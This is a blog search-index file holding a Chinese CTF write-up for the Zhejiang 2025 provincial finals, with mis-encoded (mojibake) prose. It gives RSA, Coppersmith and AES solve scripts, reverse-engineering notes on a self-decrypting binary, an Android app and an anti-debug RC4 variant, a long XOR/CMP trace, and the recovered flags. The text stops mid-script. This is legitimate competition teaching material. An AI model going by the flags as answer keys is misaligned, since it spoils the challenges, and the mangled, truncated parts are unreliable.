<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2025å†³èµ›wp</title>
    <link href="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/"/>
    <url>/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p>å°æ¦œå‰rank11æœ€ç»ˆåœ†æ¢¦çœä¸€ï¼Œæ„Ÿè°¢qetxâœŒå¸¦é£</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç®€å•æ•°å­¦é¢˜"><a href="#ç®€å•æ•°å­¦é¢˜" class="headerlink" title="ç®€å•æ•°å­¦é¢˜"></a>ç®€å•æ•°å­¦é¢˜</h2><p>ç»™äº†på’Œqå’Œä¸å·®ï¼Œç›´æ¥ç›¸åŠ ç›¸å‡å¾—åˆ°på’Œqï¼Œåé¢ç›´æ¥è§£rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>sum_pq = <span class="hljs-number">15870713655456272818998868095126610389501417235762009793315127525027164306871912572802442396878309282140184445917718237547340279497682840149930939938364752</span><br>diff_pq = <span class="hljs-number">836877201325346306269647062252443025692393860257609240213263622058769344319275021861627524327674665653956022396760961371531780934904914806513684926008590</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">24161337439375469726924397660125738582989340535865292626109110404205047138648291988394300469831314677804449487707306159537988907383165388647811395995713768215918986950780552907040433887058197369446944754008620731946047814491450890197003594397567524722975778515304899628035385825818809556412246258855782770070</span><br>p=(sum_pq+diff_pq)//<span class="hljs-number">2</span><br>q=(sum_pq-diff_pq)//<span class="hljs-number">2</span><br>n=p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;DASCTF&#123;ok_1+1_1s_ez_so_try2goldbachs&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>cbcåŠ å¯†ï¼Œç»™äº†keyç”Ÿæˆæ–¹æ³•ï¼Œå¯†æ–‡å’Œiv</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256260580-505b489f-38d3-4da9-b6b5-0c25c3ff6034.png" class="" title="img"><p>md5ç”Ÿæˆkey</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256262226-08086f6e-818f-47ad-aae3-dea93707033a.png" class="" title="img"><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256402875-8685ce16-e9db-4b12-a267-c97c2ba6f734.png" class="" title="img"><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>ç›´æ¥å¤§å¨è§£å¯†</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763468231480-f0d1a665-08d6-4147-a4ff-d8261cbfefe4.png" class="" title="image.png"><h2 id="brainRSA-1"><a href="#brainRSA-1" class="headerlink" title="brainRSA-1"></a>brainRSA-1</h2><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765617617835-613ee958-a584-45e5-beff-9e496401b583.png" class="" title="img"><p>å¯¹äºç¬¬ä¸€ä¸ªhintå¯ä»¥è¿™æ ·å˜æ¢</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765617631676-e8e04c83-a23c-4ec2-b46e-bb6e35c94252.png" class="" title="img"><p>åé¢å¯ä»¥é€šè¿‡coppersmithè§£å‡ºp</p><p>å¦‚æœm&lt;pï¼Œé‚£ä¹ˆmod nå’Œmod pç­‰ä»·ï¼Œæ‰€ä»¥åé¢phiå¯ä»¥ç”¨p-1æ¥æ›¿ä»£ï¼Œè¿™æ ·å‡è®¾èƒ½æ±‚å‡ºflagï¼Œä½†æ˜¯æ±‚ä¸å‡ºqæ— æ³•éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">5896603616629976388681343986666930963006582028163928714145532756203237227730274711487003166019427105897965945120232260215410992579837484059292611073419586380525003988344574914431029827063806077732189986757809721088722985286036959879820708133146403409430195581622055470667222891220979774304289695570081825139756219411812254290165809196979501734849253222466549260913814647528326035080523330064602920600175311072318677328858357572118378221037611447468353988765857728693723209366913388728379914720462400719453373674212484217</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">4221793406745090448159839492516441941495929321499567123472000442699162146372220161860225184236927618558037325910707307459975466187269605134233560519157016842737834824730633694720444565009425747524144994992594172304437752960220406217437575205487944977177237131899857115110278358933279454006801350405232784421011170963118967018535823980784090051685902395650907846245302374549113152846903151411198578675291462184512223571295652757739539096560166939391938607962013244587459259461981764347874215325536867806205636381420076263</span><br>h1 = <span class="hljs-number">86682368885754481246073975629273374009118678612781484142142233010648189936701991035424570227832428961089155099087480306450429844896945882196738935354601757929219259054136973233403527177389212490240890908590489235856630191642125591379880282065718229563065862910111151238228617993062409710807546317753676418582796716091984804706084632849079312032895792218093262044435</span><br>h2 = <span class="hljs-number">507302396516541130096005191243501282527086130677192353031178107965055262527263846570902262566241833462389458229472609073835612242905629592637875830766904</span><br><br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = x^<span class="hljs-number">3</span> - h1*x^<span class="hljs-number">2</span>+x<br>p = <span class="hljs-built_in">int</span>(f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">512</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(p)<br><br>d = inverse(e,p-<span class="hljs-number">1</span>)<br>m = <span class="hljs-built_in">pow</span>(c,d,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># b&#x27;flag&#123;V#@Ry_@ASSy_Pr013L@m-for_RsA!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ä½ æ˜¯æˆ‘çš„å¤©å‘½äººå—"><a href="#ä½ æ˜¯æˆ‘çš„å¤©å‘½äººå—" class="headerlink" title="ä½ æ˜¯æˆ‘çš„å¤©å‘½äººå—"></a>ä½ æ˜¯æˆ‘çš„å¤©å‘½äººå—</h2><p>ç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯VirtualProtectè‡ªè§£å¯†</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256434936-ee356a50-f662-41cf-a310-bd982ad08ef2.png" class="" title="img"><p>ç¬¬äºŒä¸ªå‡½æ•°è¿›å…¥ä¹‹ååˆ›å»ºå‡½æ•°</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256449828-7249252a-e9a2-4b7b-be02-21f6b850aac9.png" class="" title="img"><p>è¾“å…¥å…ˆå¼‚æˆ–iå†è½¬æˆhex</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256457215-5ff8d148-28ca-4d62-9308-3baaecdf420c.png" class="" title="img"><p>ç›´æ¥é€†å‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;4440514050437D3E386C3A3F3E6F386D232124202D7420742C2F2E282525782D124344471015405A&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^(i//<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;90e042b6b30639a6c464398f22bfd40f&#125;</span><br></code></pre></td></tr></table></figure><h2 id="androidtest"><a href="#androidtest" class="headerlink" title="androidtest"></a>androidtest</h2><p>jadxåç¼–è¯‘ä¸å®Œå…¨ï¼Œç”¨jebæ‰“å¼€å‘ç°base32çš„è¡¨</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256519296-d9566e44-42e6-4982-83f4-b95af62d37de.png" class="" title="img"><p>soå±‚ä¸‹å­˜åœ¨å¯†æ–‡</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256525099-c01b9517-fd74-4223-a0e7-abf94e5eb0ac.png" class="" title="img"><p>å…ˆbase32è§£å¯†</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763515316980-22611cf9-76fd-4a3c-a196-68d07f1af008.png" class="" title="img"><p>æ¯”èµ›æœŸé—´é€šè¿‡æµ‹è¯•ä¹‹åçŒœæµ‹å†xor44èƒ½å¾—åˆ°flag<img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763256533924-bfe695e8-15cd-4c5f-89fe-1d22926f5f53.png" class="" title="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x68</span> ,<span class="hljs-number">0x6d</span> ,<span class="hljs-number">0x7f</span> ,<span class="hljs-number">0x6f</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x6a</span> ,<span class="hljs-number">0x57</span> ,<span class="hljs-number">0x4d</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x5e</span> ,<span class="hljs-number">0x43</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x4d</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x58</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x4d</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x58</span> ,<span class="hljs-number">0x49</span> ,<span class="hljs-number">0x5f</span> ,<span class="hljs-number">0x58</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x5f</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x58</span> ,<span class="hljs-number">0x49</span> ,<span class="hljs-number">0x5e</span> ,<span class="hljs-number">0x49</span> ,<span class="hljs-number">0x5f</span> ,<span class="hljs-number">0x58</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x4b</span> ,<span class="hljs-number">0x51</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-number">44</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;android_anti_and_test_is_interesting&#125;</span><br></code></pre></td></tr></table></figure><p>äº¤å‰å¼•ç”¨ret_stræ–¹æ³•æ‰¾åˆ°å…³é”®åŠ å¯†ï¼ŒOnclické‡Œé¢å…ˆæ‰§è¡Œxor 44å†base32åŠ å¯†åå’Œå¯†æ–‡æ¯”è¾ƒ</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1763470802481-a996f09c-9a23-4b25-a03c-550ef0f73239.png" class="" title="img"><h2 id="Warning-1"><a href="#Warning-1" class="headerlink" title="Warning-1"></a>Warning-1</h2><p>è¿™é¢˜æ²¡æœ‰è¾“å…¥çš„åœ°æ–¹ï¼Œç›´æ¥ä¸‹æ–­ç‚¹è°ƒè¯•ä¼šä¸­æ–­é€€å‡º</p><p>è¾“å…¥ä¹Ÿä¸æ˜¯ä½œä¸ºargvä¼ å…¥ï¼Œé‚£å°±åªèƒ½åœ¨debugé‡Œé¢ä½œä¸ºparmä¼ å…¥</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765525328372-52581f86-0122-46e0-8fb1-e87d2ce9f548.png" class="" title="img"><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765530307838-a2775ab0-bf0e-451e-b735-1538ebf226a1.png" class="" title="img"><p>trace xor</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765530255907-083d7070-d640-4b8c-8bee-f1a28a8c0cb2.png" class="" title="img"><p>trace cmp</p><img src="/2025/11/16/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%86%B3%E8%B5%9Bwp/1765530561764-397c388b-adc1-48ee-998f-536892ea5dac.png" class="" title="img"><p>ä¸Šè¿°traceåå¾—åˆ°å¦‚ä¸‹å†…å®¹</p><p>æ ¹æ®0x100çŒœæµ‹å¯èƒ½æ˜¯rc4ï¼Œç¬¬ä¸€æ­¥æ˜¯é­”æ”¹çš„åœ°æ–¹ï¼Œxor ä¸‹æ ‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs plain">XOR: 0x31 ^ 0x0 = 0x31<br>CMP: 0x2e == 0x1<br>XOR: 0x31 ^ 0x1 = 0x30<br>CMP: 0x2e == 0x2<br>XOR: 0x31 ^ 0x2 = 0x33<br>CMP: 0x2e == 0x3<br>XOR: 0x31 ^ 0x3 = 0x32<br>CMP: 0x2e == 0x4<br>XOR: 0x31 ^ 0x4 = 0x35<br>CMP: 0x2e == 0x5<br>XOR: 0x31 ^ 0x5 = 0x34<br>CMP: 0x2e == 0x6<br>XOR: 0x31 ^ 0x6 = 0x37<br>CMP: 0x2e == 0x7<br>XOR: 0x31 ^ 0x7 = 0x36<br>CMP: 0x2e == 0x8<br>XOR: 0x31 ^ 0x8 = 0x39<br>CMP: 0x2e == 0x9<br>XOR: 0x31 ^ 0x9 = 0x38<br>CMP: 0x2e == 0xa<br>XOR: 0x31 ^ 0xa = 0x3b<br>CMP: 0x2e == 0xb<br>XOR: 0x31 ^ 0xb = 0x3a<br>CMP: 0x2e == 0xc<br>XOR: 0x31 ^ 0xc = 0x3d<br>CMP: 0x2e == 0xd<br>XOR: 0x31 ^ 0xd = 0x3c<br>CMP: 0x2e == 0xe<br>XOR: 0x31 ^ 0xe = 0x3f<br>CMP: 0x2e == 0xf<br>XOR: 0x31 ^ 0xf = 0x3e<br>CMP: 0x2e == 0x10<br>XOR: 0x31 ^ 0x10 = 0x21<br>CMP: 0x2e == 0x11<br>XOR: 0x31 ^ 0x11 = 0x20<br>CMP: 0x2e == 0x12<br>XOR: 0x31 ^ 0x12 = 0x23<br>CMP: 0x2e == 0x13<br>XOR: 0x31 ^ 0x13 = 0x22<br>CMP: 0x2e == 0x14<br>XOR: 0x31 ^ 0x14 = 0x25<br>CMP: 0x2e == 0x15<br>XOR: 0x31 ^ 0x15 = 0x24<br>CMP: 0x2e == 0x16<br>XOR: 0x31 ^ 0x16 = 0x27<br>CMP: 0x2e == 0x17<br>XOR: 0x31 ^ 0x17 = 0x26<br>CMP: 0x2e == 0x18<br>XOR: 0x31 ^ 0x18 = 0x29<br>CMP: 0x2e == 0x19<br>XOR: 0x31 ^ 0x19 = 0x28<br>CMP: 0x2e == 0x1a<br>XOR: 0x31 ^ 0x1a = 0x2b<br>CMP: 0x2e == 0x1b<br>XOR: 0x31 ^ 0x1b = 0x2a<br>CMP: 0x2e == 0x1c<br>XOR: 0x31 ^ 0x1c = 0x2d<br>CMP: 0x2e == 0x1d<br>XOR: 0x31 ^ 0x1d = 0x2c<br>CMP: 0x2e == 0x1e<br>XOR: 0x31 ^ 0x1e = 0x2f<br>CMP: 0x2e == 0x1f<br>XOR: 0x31 ^ 0x1f = 0x2e<br>CMP: 0x2e == 0x20<br>XOR: 0x31 ^ 0x20 = 0x11<br>CMP: 0x2e == 0x21<br>XOR: 0x31 ^ 0x21 = 0x10<br>CMP: 0x2e == 0x22<br>XOR: 0x31 ^ 0x22 = 0x13<br>CMP: 0x2e == 0x23<br>XOR: 0x31 ^ 0x23 = 0x12<br>CMP: 0x2e == 0x24<br>XOR: 0x31 ^ 0x24 = 0x15<br>CMP: 0x2e == 0x25<br>XOR: 0x31 ^ 0x25 = 0x14<br>CMP: 0x2e == 0x26<br>XOR: 0x31 ^ 0x26 = 0x17<br>CMP: 0x2e == 0x27<br>XOR: 0x31 ^ 0x27 = 0x16<br>CMP: 0x2e == 0x28<br>XOR: 0x31 ^ 0x28 = 0x19<br>CMP: 0x2e == 0x29<br>XOR: 0x31 ^ 0x29 = 0x18<br>CMP: 0x2e == 0x2a<br>XOR: 0x31 ^ 0x2a = 0x1b<br>CMP: 0x2e == 0x2b<br>XOR: 0x31 ^ 0x2b = 0x1a<br>CMP: 0x2e == 0x2c<br>XOR: 0x31 ^ 0x2c = 0x1d<br>CMP: 0x2e == 0x2d<br>XOR: 0x31 ^ 0x2d = 0x1c<br>CMP: 0x2e == 0x2e<br>CMP: 0x100 == 0x1<br>CMP: 0x100 == 0x2<br>CMP: 0x100 == 0x3<br>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦<br>CMP: 0x100 == 0x100<br>XOR: 0x31 ^ 0x50 = 0x61<br>CMP: 0x1 == 0x2e<br>XOR: 0x30 ^ 0x67 = 0x57<br>CMP: 0x2 == 0x2e<br>XOR: 0x33 ^ 0x21 = 0x12<br>CMP: 0x3 == 0x2e<br>XOR: 0x32 ^ 0x2b = 0x19<br>CMP: 0x4 == 0x2e<br>XOR: 0x35 ^ 0xce = 0xfb<br>CMP: 0x5 == 0x2e<br>XOR: 0x34 ^ 0xd7 = 0xe3<br>CMP: 0x6 == 0x2e<br>XOR: 0x37 ^ 0x84 = 0xb3<br>CMP: 0x7 == 0x2e<br>XOR: 0x36 ^ 0x3a = 0xc<br>CMP: 0x8 == 0x2e<br>XOR: 0x39 ^ 0xf5 = 0xcc<br>CMP: 0x9 == 0x2e<br>XOR: 0x38 ^ 0xc2 = 0xfa<br>CMP: 0xa == 0x2e<br>XOR: 0x3b ^ 0xc2 = 0xf9<br>CMP: 0xb == 0x2e<br>XOR: 0x3a ^ 0x22 = 0x18<br>CMP: 0xc == 0x2e<br>XOR: 0x3d ^ 0x48 = 0x75<br>CMP: 0xd == 0x2e<br>XOR: 0x3c ^ 0x1d = 0x21<br>CMP: 0xe == 0x2e<br>XOR: 0x3f ^ 0x14 = 0x2b<br>CMP: 0xf == 0x2e<br>XOR: 0x3e ^ 0x2a = 0x14<br>CMP: 0x10 == 0x2e<br>XOR: 0x21 ^ 0x71 = 0x50<br>CMP: 0x11 == 0x2e<br>XOR: 0x20 ^ 0x25 = 0x5<br>CMP: 0x12 == 0x2e<br>XOR: 0x23 ^ 0xa7 = 0x84<br>CMP: 0x13 == 0x2e<br>XOR: 0x22 ^ 0x73 = 0x51<br>CMP: 0x14 == 0x2e<br>XOR: 0x25 ^ 0x3c = 0x19<br>CMP: 0x15 == 0x2e<br>XOR: 0x24 ^ 0x9c = 0xb8<br>CMP: 0x16 == 0x2e<br>XOR: 0x27 ^ 0x72 = 0x55<br>CMP: 0x17 == 0x2e<br>XOR: 0x26 ^ 0xfe = 0xd8<br>CMP: 0x18 == 0x2e<br>XOR: 0x29 ^ 0x3c = 0x15<br>CMP: 0x19 == 0x2e<br>XOR: 0x28 ^ 0xb7 = 0x9f<br>CMP: 0x1a == 0x2e<br>XOR: 0x2b ^ 0xad = 0x86<br>CMP: 0x1b == 0x2e<br>XOR: 0x2a ^ 0x80 = 0xaa<br>CMP: 0x1c == 0x2e<br>XOR: 0x2d ^ 0xa9 = 0x84<br>CMP: 0x1d == 0x2e<br>XOR: 0x2c ^ 0x6f = 0x43<br>CMP: 0x1e == 0x2e<br>XOR: 0x2f ^ 0x37 = 0x18<br>CMP: 0x1f == 0x2e<br>XOR: 0x2e ^ 0x46 = 0x68<br>CMP: 0x20 == 0x2e<br>XOR: 0x11 ^ 0x91 = 0x80<br>CMP: 0x21 == 0x2e<br>XOR: 0x10 ^ 0x32 = 0x22<br>CMP: 0x22 == 0x2e<br>XOR: 0x13 ^ 0xb4 = 0xa7<br>CMP: 0x23 == 0x2e<br>XOR: 0x12 ^ 0xf7 = 0xe5<br>CMP: 0x24 == 0x2e<br>XOR: 0x15 ^ 0xa5 = 0xb0<br>CMP: 0x25 == 0x2e<br>XOR: 0x14 ^ 0xad = 0xb9<br>CMP: 0x26 == 0x2e<br>XOR: 0x17 ^ 0xd8 = 0xcf<br>CMP: 0x27 == 0x2e<br>XOR: 0x16 ^ 0x6b = 0x7d<br>CMP: 0x28 == 0x2e<br>XOR: 0x19 ^ 0x35 = 0x2c<br>CMP: 0x29 == 0x2e<br>XOR: 0x18 ^ 0x8c = 0x94<br>CMP: 0x2a == 0x2e<br>XOR: 0x1b ^ 0xe4 = 0xff<br>CMP: 0x2b == 0x2e<br>XOR: 0x1a ^ 0x0 = 0x1a<br>CMP: 0x2c == 0x2e<br>XOR: 0x1d ^ 0x20 = 0x3d<br>CMP: 0x2d == 0x2e<br>XOR: 0x1c ^ 0x2e = 0x32<br>CMP: 0x2e == 0x2e<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§æ€è·¯ç›´æ¥å†™è„šæœ¬ï¼Œå‘ç°å°±æ˜¯flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">key=[<span class="hljs-number">0x50</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xc2</span>,<br>     <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x25</span>, <span 